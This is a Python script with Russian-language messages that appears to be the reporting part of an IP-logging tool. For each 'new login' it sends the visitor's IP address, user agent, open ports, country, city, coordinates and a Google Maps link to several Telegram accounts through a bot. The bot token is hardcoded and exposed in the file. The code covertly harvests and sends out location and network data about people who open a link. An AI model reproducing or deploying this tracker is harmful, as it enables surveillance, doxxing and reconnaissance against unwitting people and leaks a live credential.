import requests
import time

TOKEN = "8378907712:AAFQfHHO7SnYb1xErSQmWSQ87Ln9Dz9sWFU"
ADMIN_IDS = ["45644013", "2", "3", "4"]

def get_port_service(port):
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 443: "HTTPS", 993: "IMAPS",
        995: "POP3S", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
    }
    return services.get(port, f"Port {port}")

def send_info(info, open_ports):
    # Форматируем информацию о портах
    ports_text = ""
    for i, port in enumerate(open_ports[:5]):  # Максимум 5 портов
        service = get_port_service(port)
        prefix = "├" if i < len(open_ports[:5]) - 1 else "└"
        ports_text += f"{prefix}{service}: {port}\n"
    
    if not ports_text:
        ports_text = "└No open ports found\n"
    
    # Создаем ссылку на карты
    maps_link = f"https://www.google.com/maps?q={info['lat']},{info['lon']}" if info['lat'] != 'N/A' and info['lon'] != 'N/A' else "N/A"
    
    message = f"""
🔍Новый вход
├IP - адрес: {info['ip']}
└User - Agent: {info['user_agent'][:100]}

🔍Порты IP - адреса
{ports_text}
🔍Информация об IP - адресе
├Страна: {info['country']}
├Город: {info['city']}
├Долгота: {info['lon']}
├Широта: {info['lat']}
└Ссылка на карты: {maps_link}

⏰ Время: {info['timestamp']}
    """
    
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        
        for admin_id in ADMIN_IDS:
            data = {
                "chat_id": admin_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            response = requests.post(url, data=data)
            if response.status_code == 200:
                print(f"✅ Уведомление отправлено админу {admin_id}")
            else:
                print(f"❌ Ошибка отправки админу {admin_id}: {response.text}")
        
    except Exception as e:
        print(f"💥 Ошибка Telegram: {e}")
